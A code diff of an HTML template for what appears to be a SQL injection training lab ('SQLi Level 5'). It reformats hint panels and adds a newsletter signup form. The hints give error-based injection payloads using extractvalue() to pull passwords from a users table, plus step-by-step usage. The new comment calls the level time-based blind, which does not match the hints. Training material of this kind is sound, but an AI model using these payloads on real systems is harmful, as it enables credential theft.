@@ -37,7 +37,9 @@
                     </h2>
                     <div id="hint1" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            Some applications display SQL error messages. Use functions that cause errors containing your data: <code>' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--</code>
+                            Some applications display SQL error messages. Use functions that cause errors containing
+                            your data:
+                            <code>' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--</code>
                         </div>
                     </div>
                 </div>
@@ -50,7 +52,9 @@
                     </h2>
                     <div id="hint2" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            MySQL: <code>extractvalue()</code>, <code>updatexml()</code>. PostgreSQL: <code>CAST()</code> errors. MSSQL: <code>CONVERT()</code> errors. Each database has functions that can leak data in errors.
+                            MySQL: <code>extractvalue()</code>, <code>updatexml()</code>. PostgreSQL:
+                            <code>CAST()</code> errors. MSSQL: <code>CONVERT()</code> errors. Each database has
+                            functions that can leak data in errors.
                         </div>
                     </div>
                 </div>
@@ -63,7 +67,15 @@
                     </h2>
                     <div id="hint3" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            <strong>Step-by-step:</strong><ol class='mb-2 mt-2'><li>Trigger error: <code>?id=1'</code> (see if errors are displayed)</li><li>Extract data: <code>?id=1' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--</code></li><li>Read the password from the error message</li></ol><strong>Why it works:</strong> Error messages inadvertently display the data you're querying.
+                            <strong>Step-by-step:</strong>
+                            <ol class='mb-2 mt-2'>
+                                <li>Trigger error: <code>?id=1'</code> (see if errors are displayed)</li>
+                                <li>Extract data:
+                                    <code>?id=1' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--</code>
+                                </li>
+                                <li>Read the password from the error message</li>
+                            </ol><strong>Why it works:</strong> Error messages inadvertently display the data you're
+                            querying.
                         </div>
                     </div>
                 </div>
@@ -98,8 +110,40 @@
             </div>
         </div>
 
-        <div class="app-frame p-4">
-            <p class="text-muted">Challenge interface for SQLi Level 5</p>
+        <!-- Level 5: Time-Based Blind SQL Injection -->
+        <div class="card border-0 shadow-none mb-4">
+            <div class="card-body">
+                <h4 class="mb-3">Newsletter Subscription</h4>
+
+                {% if message %}
+                <div class="alert alert-{{ message_type }} border-0 d-flex align-items-center mb-4">
+                    {% if message_type == 'success' %}
+                    <i class="bi bi-check-circle-fill me-2"></i>
+                    {% else %}
+                    <i class="bi bi-exclamation-triangle-fill me-2"></i>
+                    {% endif %}
+                    <div>{{ message }}</div>
+                </div>
+                {% endif %}
+
+                {% if response_time %}
+                <div class="mb-3">
+                    <small class="text-muted">Server response time: {{ response_time }} seconds</small>
+                </div>
+                {% endif %}
+
+                <form method="POST" action="{{ url_for('sqli_level5') }}">
+                    <div class="mb-3">
+                        <label class="form-label">Email Address</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="bi bi-envelope"></i></span>
+                            <input type="text" class="form-control" name="email" placeholder="user@example.com">
+                        </div>
+                        <div class="form-text">Subscribe to get the latest updates.</div>
+                    </div>
+                    <button type="submit" class="btn btn-primary w-100">Subscribe</button>
+                </form>
+            </div>
         </div>
     </div>
 </div>
